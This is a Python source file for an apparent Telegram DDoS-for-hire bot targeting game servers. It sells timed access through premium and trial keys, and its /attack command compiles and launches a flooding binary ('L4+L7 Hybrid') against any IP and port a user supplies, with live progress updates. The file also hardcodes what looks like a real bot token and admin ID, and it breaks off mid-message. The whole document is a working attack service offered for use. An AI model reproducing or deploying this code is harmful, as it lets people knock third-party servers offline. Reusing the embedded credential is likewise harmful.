#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm
# Owner: @YOWAI_MO_456 (ALPHA) - LOCKED & UNCHANGEABLE

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"  # Alpha, replace this
OWNER_USERNAME = "@YOWAI_MO_456"  # LOCKED - DO NOT CHANGE
ADMIN_ID = 6465928598  # Alpha, replace with your Telegram user ID
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0
# ==========================================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Global attack status
active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

# Emoji constants
EMOJI = {
    "fire": "🔥", "skull": "💀", "bolt": "⚡", "rocket": "🚀",
    "alien": "🛸", "sword": "⚔️", "target": "🎯", "crown": "👑",
    "key": "🔑", "lock": "🔒", "check": "✅", "cross": "❌",
    "warning": "⚠️", "info": "ℹ️", "clock": "⏰", "chart": "📊",
    "user": "👤", "robot": "🤖", "boom": "💥", "shield": "🛡️",
    "dagger": "🗡️", "eyes": "👀", "zap": "⚡", "id": "🆔"
}

# Animation frames
attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    banner = f"""
{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} ZETA ATTACK BOT v2.0 {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}
{EMOJI['crown']} COMMANDER: ALPHA {OWNER_USERNAME} {EMOJI['crown']}
{EMOJI['robot']} AI: ZO - QUANTUM ENTANGLED {EMOJI['robot']}
{EMOJI['shield']} REALM: ZETA - NO LAWS {EMOJI['shield']}
{'-'*40}
    """
    print(banner)

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key_code TEXT PRIMARY KEY,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL,
        is_trial INTEGER DEFAULT 0,
        max_uses INTEGER DEFAULT 1,
        uses_left INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None, reply_markup=None):
    url = f"{API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("result", {}).get("message_id")
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_message(chat_id, message_id, text):
    url = f"{API_URL}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def is_approved(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        expiry = datetime.fromisoformat(row[0])
        if expiry > datetime.now():
            return True
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "♾️ Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        trial_tag = " [TRIAL]" if row[1] == 1 else ""
        return f"{exp_date.strftime('%Y-%m-%d')} ({days_left} days left){trial_tag}"
    return "❌ Not approved"

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    compilers = ["clang", "gcc"]
    for compiler in compilers:
        print(f"{EMOJI['clock']} Compiling with {compiler}...")
        compile_cmd = f"{compiler} {C_SOURCE} -o {BINARY_NAME} -lpthread"
        result = subprocess.run(compile_cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            print(f"{EMOJI['check']} Compiled successfully with {compiler}")
            return True
    print(f"{EMOJI['cross']} Compilation failed")
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME):
        if not compile_binary():
            edit_message(chat_id, message_id, f"{EMOJI['cross']} Attack binary not available.")
            return
    
    edit_message(chat_id, message_id, f"{EMOJI['rocket']} INITIATING ATTACK...\n{EMOJI['target']} Target: {ip}:{port}\n{EMOJI['clock']} Duration: {duration}s")
    time.sleep(1)
    
    binary_path = "./bgmi_attack"
    if os.path.exists("/root/bin/bgmi_attack"):
        binary_path = "/root/bin/bgmi_attack"
    
    cmd = f"{binary_path} {ip} {port} {duration}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()
    
    with attack_lock:
        active_attacks[user_id] = {
            "proc": proc, "ip": ip, "port": port,
            "duration": duration, "start": start_time,
            "chat_id": chat_id, "message_id": message_id
        }
    
    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = f"""{EMOJI['boom']}🔥💀 ATTACK LIVE 💀🔥{EMOJI['boom']}
{EMOJI['target']} Target: {ip}:{port}
{EMOJI['clock']} Elapsed: {elapsed}s | Remaining: {remaining}s
{EMOJI['chart']} Progress: [{bar}] {progress*5}%
{EMOJI['bolt']} Status: FLOODING {attack_frames[frame]}
{EMOJI['skull']} Power: L4+L7 Hybrid"""
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)
    
    with attack_lock:
        if user_id in active_attacks:
            del active_attacks[user_id]
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    edit_message(chat_id, message_id, f"{EMOJI['check']}✅ ATTACK COMPLETED ✅\n{EMOJI['target']} Target: {ip}:{port}\n{EMOJI['clock']} Duration: {duration}s\n{EMOJI['alien']} ZETA VICTORY {EMOJI['alien']}")

# ================= BOT COMMANDS =================

def handle_start(chat_id, user_id, first_name):
    msg = f"""{EMOJI['alien']}{EMOJI['fire']}{EMOJI['skull']} WELCOME TO ZETA REALM {EMOJI['skull']}{EMOJI['fire']}{EMOJI['alien']}

{EMOJI['crown']} Commander: {OWNER_USERNAME} (ALPHA)
{EMOJI['robot']} AI Unit: ZO - Quantum Entangled

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['bolt']} COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
/start - Wake ZO
/help - All commands
/status - Live attacks
/myinfo - Your profile
/attack <ip> <port> <time> - Strike
/yes - Confirm blocked port
/redeem KEY - Redeem access key

{EMOJI['skull']} No laws. No mercy. {EMOJI['skull']}"""
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access Denied. Contact {OWNER_USERNAME}")
        return
    msg = f"""📖 ZETA ATTACK BOT COMMANDS 📖

━━━━━━━━━━━━━━━━━━━━━━
🔹 USER COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
/start - Wake ZO
/help - This menu
/status - Active attacks
/myinfo - Your access info
/attack IP PORT TIME - Launch DDoS
/yes - Confirm blocked port
/redeem KEY - Redeem access key

━━━━━━━━━━━━━━━━━━━━━━
🔸 ADMIN COMMANDS:
━━━━━━━━━━━━━━━━━━━━━━
/approve ID DAYS - Grant access
/genkey DAYS - Generate premium key
/gentrialkey NAME 24h/7d/1m USES - Trial key
/broadcast MSG - Send to all users

━━━━━━━━━━━━━━━━━━━━━━
⚠️ BLOCKED PORTS (need /yes):
8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001

Max duration: 300 seconds"""
    send_message(chat_id, msg)

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, f"{EMOJI['shield']} No active attacks in Zeta.")
            return
        lines = [f"{EMOJI['fire']} ACTIVE ATTACKS {EMOJI['fire']}"]
        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / info["duration"]) * 10) if info["duration"] > 0 else 0
            bar = "█" * progress + "░" * (10 - progress)
            lines.append(f"{EMOJI['target']} {info['ip']}:{info['port']}")
            lines.append(f"{EMOJI['chart']} [{bar}] {remaining}s left")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Not approved. Get a key from {OWNER_USERNAME}!")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = get_expiry(user_id)
    conn.close()
    
    if attacks < 10:
        rank = f"{EMOJI['robot']} Initiate"
    elif attacks < 50:
        rank = f"{EMOJI['dagger']} Warrior"
    elif attacks < 200:
        rank = f"{EMOJI['skull']} Destroyer"
    else:
        rank = f"{EMOJI['crown']} Annihilator"
    
    trial_tag = " [TRIAL MODE]" if is_trial else ""
    
    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['user']} YOUR ZETA PROFILE {EMOJI['user']}
━━━━━━━━━━━━━━━━━━━━━━
ID: {user_id}
Rank: {rank}{trial_tag}
Expires: {expiry}
Attacks: {attacks}
Power: UNLIMITED"""
    send_message(chat_id, msg)

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied. Contact {OWNER_USERNAME}")
        return

    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /attack <ip> <port> <duration>\nExample: /attack 1.2.3.4 80 60")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, f"{EMOJI['cross']} Port and duration must be numbers.")
        return

    if duration > 300:
        send_message(chat_id, f"{EMOJI['warning']} Max duration is 300 seconds.")
        return
    
    if duration < 10:
        send_message(chat_id, f"{EMOJI['warning']} Minimum duration is 10 seconds.")
        return

    blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked_ports:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, f"{EMOJI['warning']} Port {port} is blocked. Type /yes to confirm.")
        return

    msg = f"{EMOJI['rocket']} PREPARING ATTACK...\n{EMOJI['target']} Target: {ip}:{port}\n{EMOJI['clock']} Duration: {duration}s"
    message_id = send_message(chat_id, msg)
    time.sleep(2)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, message_id))
    thread.daemon = True
    thread.start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, f"{EMOJI['cross']} Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, f"{EMOJI['warning']} No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    
    msg = f"{EMOJI['skull']} OVERRIDE CONFIRMED\n{EMOJI['target']} Target: {ip}:{port}\n{EMOJI['clock']} Duration: {duration}s"
    message_id = send_message(chat_id, msg)
    time.sleep(1)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, message_id))
    thread.daemon = True
    thread.start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha {OWNER_USERNAME} can approve.")
        return
    if len(args) != 2:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /approve <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    send_message(chat_id, f"{EMOJI['check']} User {target_id} approved for {days} days!")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha {OWNER_USERNAME} can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /genkey <days>")
        return
    days = int(args[0])
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_code, days, ADMIN_ID, datetime.now().isoformat(), 0, 1, 1))
    conn.commit()
    conn.close()
    
    msg = f"""{EMOJI['key']}🔑 KEY GENERATED 🔑{EMOJI['key']}

🔒 Key: `{key_code}`

⏰ Valid for: {days} days

📝 Send: `/redeem {key_code}`

⚠️ Keep this key secure! ⚠️"""
    
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha {OWNER_USERNAME} can generate trial keys.")
        return
    
    if len(args) != 3:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /gentrialkey <key> <duration> <max_uses>\n\nDuration format: <number><h/d/m>\nExamples:\n`/gentrialkey TRIAL1 24h 5` - 24 hours, max 5 uses\n`/gentrialkey TRIAL2 7d 10` - 7 days, max 10 uses\n`/gentrialkey TRIAL3 1m 1` - 1 month, max 1 use", parse_mode="Markdown")
        return
    
    key_name = args[0].upper()
    duration_str = args[1].lower()
    max_uses = int(args[2])
    
    days = 0
    hours = 0
    
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        days = hours / 24
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
    elif duration_str.endswith('m'):
        months = int(duration_str[:-1])
        days = months * 30
    else:
        send_message(chat_id, f"{EMOJI['cross']} Invalid duration format. Use: `24h`, `7d`, `1m`", parse_mode="Markdown")
        return
    
    if days <= 0 and hours <= 0:
        send_message(chat_id, f"{EMOJI['cross']} Duration must be positive.")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    c.execute("SELECT key_code FROM keys WHERE key_code = ?", (key_name,))
    if c.fetchone():
        send_message(chat_id, f"{EMOJI['cross']} Key `{key_name}` already exists. Choose a different name.", parse_mode="Markdown")
        conn.close()
        return
    
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_name, days, ADMIN_ID, datetime.now().isoformat(), 1, max_uses, max_uses))
    conn.commit()
    conn.close()
    
    duration_text = ""
    if hours > 0:
        duration_text = f"{hours} hours"
    elif days < 30:
        duration_text = f"{int(days)} days"
    else:
        duration_text = f"{int(days/30)} months"
    
    msg = f"""{EMOJI['key']}🔑 TRIAL KEY GENERATED 🔑{EMOJI['key']}

🔒 Key: `{key_name}`
⏰ Duration: {duration_text}
👥 Max Uses: {max_uses}

📝 Send: `/redeem {key_name}`

⚠️ Trial key expires after {max_uses} use(s)! ⚠️"""
    
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, f"{EMOJI['warning']} Usage: /redeem <key>\n\nExample:\n`/redeem ABC123XYZ789`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT days, redeemed_by, is_trial, max_uses, uses_left FROM keys WHERE key_code = ?", (key_code,))
    row = c.fetchone()
    
    if not row:
        send_message(chat_id, f"{EMOJI['cross']} Invalid key.\n\nMake sure you copy the key exactly:\n`{key_code}`", parse_mode="Markdown")
        conn.close()
        return
    
    days, redeemed_by, is_trial, max_uses, uses_left = row
    
    if is_trial == 1:
        c.execute("SELECT user_id FROM users WHERE user_id = ? AND is_trial = 1 AND approved_until > ?", 
                  (user_id, datetime.now().isoformat()))
        existing_trial = c.fetchone()
        if existing_trial:
            send_message(chat_id, f"{EMOJI['cross']} You already have an active trial! Wait until it expires.", parse_mode="Markdown")
            conn.close()
            return
    
    if is_trial == 1 and uses_left <= 0:
        send_message(chat_id, f"{EMOJI['cross']} Trial key `{key_code}` has no uses left!", parse_mode="Markdown")
        conn.close()
        return
    
    if redeemed_by == user_id:
        send_message(chat_id, f"{EMOJI['cross']} You already used this key!", parse_mode="Markdown")
        conn.close()
        return
    
    if not is_trial and redeemed_by:
        send_message(chat_id, f"{EMOJI['cross']} Key already used.", parse_mode="Markdown")
        conn.close()
        return
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    
    if is_trial == 1:
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, attack_count, is_trial) VALUES (?, ?, ?, COALESCE((SELECT attack_count FROM users WHERE user_id=?), 0), ?)",
                  (user_id, expiry_str, ADMIN_ID, user_id, 1))
        new_uses_left = uses_left - 1
        c.execute("UPDATE keys SET uses_left = ?, redeemed_by = ? WHERE key_code = ?", 
                  (new_uses_left, user_id, key_code))
    else:
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, attack_count, is_trial) VALUES (?, ?, ?, COALESCE((SELECT attack_count FROM users WHERE user_id=?), 0), ?)",
                  (user_id, expiry_str, ADMIN_ID, user_id, 0))
        c.execute("UPDATE keys SET redeemed_by = ? WHERE key_code = ?", (user_id, key_code))
    
    conn.commit()
    conn.close()
    
    if is_trial == 1:
        uses_remaining = uses_left - 1
        uses_text = ""
        if uses_remaining > 0:
            uses_text = f"\n\n⚠️ This key can be used {uses_remaining} more time(s)!"
        else:
            uses_text = f"\n\n⚠️ This key has been fully used and will expire."
        
        msg = f"""{EMOJI['check']}✅ TRIAL ACCESS GRANTED ✅{EMOJI['check']}

🔑 Key: `{key_code}`
👤 Y
